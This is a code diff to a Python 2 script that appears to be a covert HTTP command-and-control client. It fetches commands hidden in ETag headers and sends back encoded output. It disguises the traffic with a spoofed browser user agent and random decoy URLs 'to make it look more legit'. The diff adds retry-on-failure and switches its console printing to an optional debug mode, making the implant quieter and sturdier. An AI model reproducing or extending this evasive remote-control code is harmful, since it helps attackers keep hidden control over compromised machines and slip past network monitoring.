@@ -47,26 +47,37 @@ MAGIC_CMD_STRING = "M4G1C"
 #  to make it look more legit..
 urls = ["/images/head.gif", "/cgi-bin/page.pl", "/home/doc/index.html", "/html/redir.html", \
         "/cgi-bin/tr.cgi", "/complete/search?ix=sea&client=chrome&hl=en-US&q=ser"]
+debug_flag = 0
 
 def random_url():
     # returns a randomized URL to request, makes traffic look legit
     return urls[random.randint(0,urls.__len__() - 1)]
+def debug(msg):
+    if debug_flag:
+        print msg
 
 if(__name__ == "__main__"):
     host = sys.argv[1]
     port = int(sys.argv[2])
+    if(sys.argv.__len__() == 4):
+        debug_flag = 1
+    debug("Debug turned on")
     while 1:
         recv_size=0
-        http = httplib.HTTPConnection(host, port)
-        headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", \
-                   "If-None-Match": INIT_CONNECTION_STRING, \
-                   "Content-type": "application/x-www-form-urlencoded", \
-                   "Accept": "text/plain"}
-        http.request("GET", random_url(), "", headers)
-        response = http.getresponse() # not really used, but tcpdump likes it
+        try:
+            http = httplib.HTTPConnection(host, port)
+            headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", \
+                       "If-None-Match": INIT_CONNECTION_STRING, \
+                       "Content-type": "application/x-www-form-urlencoded", \
+                       "Accept": "text/plain"}
+            http.request("GET", random_url(), "", headers)
+            response = http.getresponse() # not really used, but tcpdump likes it
+        except:
+            debug("couldnt connect to %s on port %s" % (sys.argv[1], sys.argv[2]))
+            continue
         if(response.getheader("Retry-After")):
                 recv_size = int(response.getheader("Retry-After")) - 50
-        print "Prepping for a recv_size of " + str(recv_size)
+        debug("Prepping for a recv_size of " + str(recv_size))
         recvd=0
         recv_chunks=[]
         while recv_size > recvd:
@@ -76,10 +87,10 @@ if(__name__ == "__main__"):
                    "Content-type": "application/x-www-form-urlencoded", \
                    "Accept": "text/plain"}
             http.request("GET", random_url(), "", headers)
-            print "Sent a CONT_CONNECTION_STRING"
+            debug("Sent a CONT_CONNECTION_STRING")
             response = http.getresponse() # not really used, but tcpdump likes it
             if(response.getheader("ETag")):
-                print "got an ETAG!"
+                debug("got an ETAG!")
                 recv_chunks[recvd] = response.getheader("ETag")
                 recvd += 1
         # put the pieces together and decode
@@ -119,7 +130,7 @@ if(__name__ == "__main__"):
         sent = 0
         # initialize the response send
         
-        print "send_size:" + str(send_size)
+        debug("send_size:" + str(send_size))
         while sent < send_size+1:
             http = httplib.HTTPConnection(host, port)
             headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", \
@@ -128,10 +139,10 @@ if(__name__ == "__main__"):
                        "Content-type": "application/x-www-form-urlencoded", \
                        "Accept": "text/plain"}
             http.request("GET", random_url(), "", headers)
-            print "Sent block: %s" % send_blocks[sent] 
+            debug("Sent block: %s" % send_blocks[sent])
             sent += 1
             #time.sleep(0.001) # necessary to not overload with http requests
             http.getresponse()
             http.close()
-        print "Sent over the command encoded as " + output
+        debug("Sent over the command encoded as " + output)
         
